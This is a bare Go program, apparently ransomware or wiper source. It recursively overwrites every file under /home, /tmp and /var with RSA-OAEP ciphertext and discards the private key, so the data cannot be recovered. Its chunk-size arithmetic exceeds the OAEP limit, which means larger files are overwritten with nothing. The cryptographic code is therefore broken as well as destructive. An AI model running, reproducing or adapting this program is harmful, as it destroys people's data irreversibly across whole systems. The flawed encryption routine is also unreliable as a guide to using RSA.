package main

import (
    "io/ioutil"
    "fmt"
    "strings"
    "time"
    "crypto/rsa"
    "crypto/rand"
    "crypto/sha256"
)

func encryptor(content []byte, key rsa.PublicKey) []byte {
    contentLen := len(content)
    hash := sha256.New()
    step := (key.Size() - 2) * (hash.Size() - 2)
    label := []byte(time.Now().Format(time.RFC3339))

    var encBytes []byte

    for start := 0; start < contentLen; start += step {
        end := start + step

        if end > contentLen {
            end = contentLen
        }

        ciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, &key, content[start:end], label)

        if err != nil {
            fmt.Println(err)
        } else {
            encBytes = append(encBytes, ciphertext...)
        }
    }

    return encBytes
}

func discoveryAndEncryptFiles(dirpath string, key rsa.PublicKey) {
    files, err := ioutil.ReadDir(dirpath)

    if err != nil {
        fmt.Println(err)
    }

    for _, file := range files {
        filepath := fmt.Sprintf("%s/%s", dirpath, file.Name())

        if strings.Contains(filepath, "node_modules") ||
            strings.Contains(filepath, "bower_components") ||
            strings.Contains(filepath, "vendor") ||
            strings.Contains(filepath, ".iso") {
            continue
        }

        if file.IsDir() {
            discoveryAndEncryptFiles(filepath, key)
        } else {
            content, err := ioutil.ReadFile(filepath)

            if err != nil {
                fmt.Println(err)
            } else {
                fmt.Println("Encrypting file...", filepath)

                err = ioutil.WriteFile(filepath, encryptor(content, key), 0644)

                if err != nil {
                    fmt.Println(err)
                }
            }
        }
    }
}

func main() {
    privKey, err := rsa.GenerateKey(rand.Reader, 4096)

    if err != nil {
        panic(err)
    }

    targetList := [3]string{"/home", "/tmp", "/var"}

    for _, dirname := range targetList {
        discoveryAndEncryptFiles(dirname, privKey.PublicKey)
    }
}
